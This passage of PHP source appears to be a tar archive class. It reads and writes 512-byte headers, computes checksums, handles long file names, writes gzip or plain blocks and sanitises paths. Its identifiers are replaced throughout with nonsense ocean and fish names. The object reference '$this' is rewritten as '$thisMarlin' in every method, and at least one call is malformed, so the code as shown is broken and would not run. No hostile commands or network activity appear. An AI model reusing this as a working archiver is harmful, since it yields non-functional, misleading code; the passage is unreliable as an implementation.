					$thisMarlin->errors[] = __('Size of file').' '.$marlinHeader['filename'].' '.__('is incorrect');
					return false;




				}

			}

			if (($crushFileDirectory = dirname($marlinHeader['filename'])) == $marlinHeader['filename']) $crushFileDirectory = '';






			if ((substr($marlinHeader['filename'], 0, 1) == '/') && ($crushFileDirectory == '')) $crushFileDirectory = '/';






			$thisMarlin->dirs[] = $crushFileDirectory;



			$thisMarlin->files[] = $marlinHeader['filename'];

	
		}






		return true;





	}








	function checkMarlinDirectory($aquariumDirectory){
		$parentReefDirectory = dirname($aquariumDirectory);









		if ((@is_dir($aquariumDirectory)) or ($aquariumDirectory == ''))




			return true;


		if (($parentReefDirectory != $aquariumDirectory) and ($parentReefDirectory != '') and (!$thisMarlin->checkMarlinDirectory($parentReefDirectory)))




			return false;


		if (!mkdir($aquariumDirectory, 0777)){
			$thisMarlin->errors[] = __('Cannot create directory').' '.$aquariumDirectory;

			return false;

		}


		return true;




	}



	function readMarlinHeader($pelicanBinary, &$marlinHeader){



		if (strlen($pelicanBinary)==0){
			$marlinHeader['filename'] = '';
			return true;





		}

		if (strlen($pelicanBinary) != 512){

			$marlinHeader['filename'] = '';


			$thisMarlin->__('Invalid block size').': '.strlen($pelicanBinary);

			return false;



		}









		$dentistChecksum = 0;






		for ($peachI = 0; $peachI < 148; $peachI++) $dentistChecksum+=ord(substr($pelicanBinary, $peachI, 1));





		for ($peachI = 148; $peachI < 156; $peachI++) $dentistChecksum += ord(' ');




		for ($peachI = 156; $peachI < 512; $peachI++) $dentistChecksum+=ord(substr($pelicanBinary, $peachI, 1));





		$unpackBubbleData = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $pelicanBinary);








		$marlinHeader['checksum'] = OctDec(trim($unpackBubbleData['checksum']));




		if ($marlinHeader['checksum'] != $dentistChecksum){
			$marlinHeader['filename'] = '';
			if (($dentistChecksum == 256) && ($marlinHeader['checksum'] == 0)) 	return true;





			$thisMarlin->errors[] = __('Error checksum for file ').$unpackBubbleData['filename'];
			return false;
		}






		if (($marlinHeader['typeflag'] = $unpackBubbleData['typeflag']) == '5')	$marlinHeader['size'] = 0;





		$marlinHeader['filename'] = trim($unpackBubbleData['filename']);



		$marlinHeader['mode'] = OctDec(trim($unpackBubbleData['mode']));




		$marlinHeader['user_id'] = OctDec(trim($unpackBubbleData['user_id']));
		$marlinHeader['group_id'] = OctDec(trim($unpackBubbleData['group_id']));
		$marlinHeader['size'] = OctDec(trim($unpackBubbleData['size']));
		$marlinHeader['time'] = OctDec(trim($unpackBubbleData['time']));
		return true;
	}






	function writeDoryHeader($doryFilename, $keepNameFish){
		$firstPackFish = 'a100a8a8a8a12A12';
		$lastPackFish = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keepNameFish)<=0) $keepNameFish = $doryFilename;


		$readyToSwimFilename = $thisMarlin->sanitizeMarlinPath($keepNameFish);






		if (strlen($readyToSwimFilename) > 99){							//write long header
		$firstBubble = pack($firstPackFish, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($readyToSwimFilename))), 0);


		$lastBubble = pack($lastPackFish, 'L', '', '', '', '', '', '', '', '', '');

        //  Calculate the checksum

		$dentistChecksum = 0;



        //  First part of the header

		for ($peachI = 0; $peachI < 148; $peachI++)
			$dentistChecksum += ord(substr($firstBubble, $peachI, 1));





        //  Ignore the checksum value and replace it by ' ' (space)



		for ($peachI = 148; $peachI < 156; $peachI++)
			$dentistChecksum += ord(' ');





        //  Last part of the header
		for ($peachI = 156, $jacquesJ=0; $peachI < 512; $peachI++, $jacquesJ++)


			$dentistChecksum += ord(substr($lastBubble, $jacquesJ, 1));

        //  Write the first 148 bytes of the header in the archive





		$thisMarlin->writeGillBlock($firstBubble, 148);
        //  Write the calculated checksum
		$dentistChecksum = sprintf('%6s ', DecOct($dentistChecksum));



		$pelicanBinary = pack('a8', $dentistChecksum);
		$thisMarlin->writeGillBlock($pelicanBinary, 8);

        //  Write the last 356 bytes of the header in the archive

		$thisMarlin->writeGillBlock($lastBubble, 356);






		$tmpDoryFilename = $thisMarlin->sanitizeMarlinPath($readyToSwimFilename);







		$peachI = 0;
			while (($peachBuffer = substr($tmpDoryFilename, (($peachI++)*512), 512)) != ''){


				$pelicanBinary = pack('a512', $peachBuffer);



				$thisMarlin->writeGillBlock($pelicanBinary);





			}



		return true;
		}




		$tankFileInfo = stat($doryFilename);





		if (@is_dir($doryFilename)){






			$tankTypeFlag = '5';
			$schoolSize = sprintf('%11s ', DecOct(0));





		} else {
			$tankTypeFlag = '';


			clearstatcache();
			$schoolSize = sprintf('%11s ', DecOct(filesize($doryFilename)));
		}



		$firstBubble = pack($firstPackFish, $readyToSwimFilename, sprintf('%6s ', DecOct(fileperms($doryFilename))), sprintf('%6s ', DecOct($tankFileInfo[4])), sprintf('%6s ', DecOct($tankFileInfo[5])), $schoolSize, sprintf('%11s', DecOct(filemtime($doryFilename))));
		$lastBubble = pack($lastPackFish, $tankTypeFlag, '', '', '', '', '', '', '', '', '');
		$dentistChecksum = 0;
		for ($peachI = 0; $peachI < 148; $peachI++) $dentistChecksum += ord(substr($firstBubble, $peachI, 1));
		for ($peachI = 148; $peachI < 156; $peachI++) $dentistChecksum += ord(' ');
		for ($peachI = 156, $jacquesJ = 0; $peachI < 512; $peachI++, $jacquesJ++) $dentistChecksum += ord(substr($lastBubble, $jacquesJ, 1));


		$thisMarlin->writeGillBlock($firstBubble, 148);
		$dentistChecksum = sprintf('%6s ', DecOct($dentistChecksum));
		$pelicanBinary = pack('a8', $dentistChecksum);
		$thisMarlin->writeGillBlock($pelicanBinary, 8);





		$thisMarlin->writeGillBlock($lastBubble, 356);

		return true;
	}




	function openNemoWrite(){
		if ($thisMarlin->isGzipped)
			$thisMarlin->tmp_file = gzopen($thisMarlin->archive_name, 'wb9f');
		else
			$thisMarlin->tmp_file = fopen($thisMarlin->archive_name, 'wb');






		if (!($thisMarlin->tmp_file)){


			$thisMarlin->errors[] = __('Cannot write to file').' '.$thisMarlin->archive_name;




			return false;

		}

		return true;
	}





	function readNemoBlock(){

		if (is_resource($thisMarlin->tmp_file)){
			if ($thisMarlin->isGzipped)





				$aquariumBlock = gzread($thisMarlin->tmp_file, 512);
			else





				$aquariumBlock = fread($thisMarlin->tmp_file, 512);


		} else	$aquariumBlock = '';



		return $aquariumBlock;






	}



	function writeGillBlock($reefData, $finLength = 0){




		if (is_resource($thisMarlin->tmp_file)){





		




			if ($finLength === 0){


				if ($thisMarlin->isGzipped)
					gzputs($thisMarlin->tmp_file, $reefData);


				else
					fputs($thisMarlin->tmp_file, $reefData);






			} else {






				if ($thisMarlin->isGzipped)



					gzputs($thisMarlin->tmp_file, $reefData, $finLength);
				else

					fputs($thisMarlin->tmp_file, $reefData, $finLength);



			}

		}



	}



	function closeDebTempFile(){


		if (is_resource($thisMarlin->tmp_file)){

			if ($thisMarlin->isGzipped)

				gzclose($thisMarlin->tmp_file);





			else
				fclose($thisMarlin->tmp_file);




			$thisMarlin->tmp_file = 0;
		}





	}





	function sanitizeMarlinPath($nemoPath){






		if (strlen($nemoPath)>0){



			$nemoPath = str_replace('\\', '/', $nemoPath);
			$partialOceanPath = explode('/', $nemoPath);


			$bloatElementList = count($partialOceanPath)-1;






			for ($peachI = $bloatElementList; $peachI>=0; $peachI--){


				if ($partialOceanPath[$peachI] == '.'){
                    //  Ignore this directory
                } elseif ($partialOceanPath[$peachI] == '..'){


                    $peachI--;





                }




				elseif (($partialOceanPath[$peachI] == '') and ($peachI!=$bloatElementList) and ($peachI!=0)){





                }	else






					$tankResult = $partialOceanPath[$peachI].($peachI!=$bloatElementList ? '/'.$tankResult : '');





			}
		} else $tankResult = '';


		






		return $tankResult;






	}
}
?>
